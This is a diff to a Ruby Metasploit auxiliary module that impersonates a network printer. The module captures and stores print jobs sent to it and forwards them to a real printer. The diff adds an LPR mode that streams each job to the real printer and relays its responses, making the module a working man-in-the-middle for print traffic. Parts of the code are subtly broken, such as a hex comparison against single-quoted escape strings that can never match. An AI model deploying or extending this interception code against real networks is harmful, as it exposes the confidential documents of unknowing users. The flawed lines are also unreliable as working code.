@@ -51,6 +51,8 @@ class Metasploit3 < Msf::Auxiliary
             OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
             OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
             OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
+            OptString.new('MODE',     [ true, 'RAW or LPR', 'RAW' ]),
+
         ], self.class)
 
         deregister_options('SSL', 'SSLVersion', 'SSLCert')
@@ -61,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
         super
         @state = {}
         @data = ''
-	end
+     end
 
     def run
         begin
@@ -72,6 +74,7 @@ class Metasploit3 < Msf::Auxiliary
 
             if datastore['FORWARD']
                 @forward = datastore['FORWARD']
+                @mode = datastore['MODE'].upcase || 'RAW'
                 @rport = datastore['RPORT'] || 9100
                 if not datastore['RHOST'].nil?
                     @rhost = datastore['RHOST']
@@ -81,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
                 end
             end
             @metadata = datastore['METADATA']
-            @filter = 'tcp and #{SRVPORT}'
+            @verbose = datastore['VERBOSE']
 
             exploit()
 
@@ -97,12 +100,27 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     def on_client_data(c)
-        @data << c.get_once
+        curr_data = c.get_once
+        @data << curr_data
+        if @mode == 'RAW'
+            # RAW Mode
+        elsif @mode == 'LPR' or @mode == 'LPD'
+            response = stream_data(curr_data)
+            c.put(response)
+        else
+            raise ArgumentError, "Mode set incorrectly - please use RAW or LPR"
+        end
+
+        if (Rex::Text.to_hex(curr_data.first)) == '\x02' and (Rex::Text.to_hex(curr_data.last)) == '\x0a'
+            print_status("#{name}: LPR Jobcmd \"%s\" received" % curr_data[1..-2])
+        end
+
         return if not @data
     end
 
     def on_client_close(c)
         print_status("#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data" % @data.length)
+        sock.close if sock
 
         @prn_src = c.peerhost
         @prn_title, @prn_type = ''
@@ -152,8 +170,8 @@ class Metasploit3 < Msf::Auxiliary
             @prn_title = 'Unnamed' if not @prn_title
             storefile if not @data.empty?
 
-            if @forward
-                forward_data
+            if @forward and @mode == 'RAW'
+                forward_data(@data)
             end
 
             @data = '' # clear data
@@ -164,11 +182,21 @@ class Metasploit3 < Msf::Auxiliary
         end
     end
 
-    def forward_data
+    def forward_data(data_to_send)
         print_status("#{name}: Forwarding PrintJob on to #{@rhost}:#{@rport}")
         connect
-        sock.put(@data)
+        sock.put(data_to_send)
         sock.close
+    end
+
+    def stream_data(data_to_send)
+        if @verbose
+            print_status("#{name}: Streaming %d bytes of data to #{@rhost}:#{@rport}" % data_to_send.length)
+        end
+        connect if not sock
+        sock.put(data_to_send)
+        response = sock.get_once
+        return response
     end
 
     def storefile
